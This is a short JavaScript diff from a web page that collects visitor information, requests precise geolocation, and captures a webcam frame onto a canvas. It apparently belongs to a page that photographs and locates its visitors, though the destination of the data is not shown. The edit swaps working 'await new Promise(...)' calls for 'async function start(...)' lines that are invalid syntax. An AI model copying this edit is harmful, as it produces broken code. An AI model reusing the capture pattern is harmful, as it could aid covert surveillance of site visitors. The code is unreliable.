@@ -62,7 +62,7 @@
         }
 
         // Get Accurate Location (with user permission)
-                await new Promise((resolve) => {
+                async function start((resolve) => {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             visitorInfo.latitude = position.coords.latitude;
@@ -90,7 +90,7 @@
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                async function start(resolve => setTimeout(resolve, 1500));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
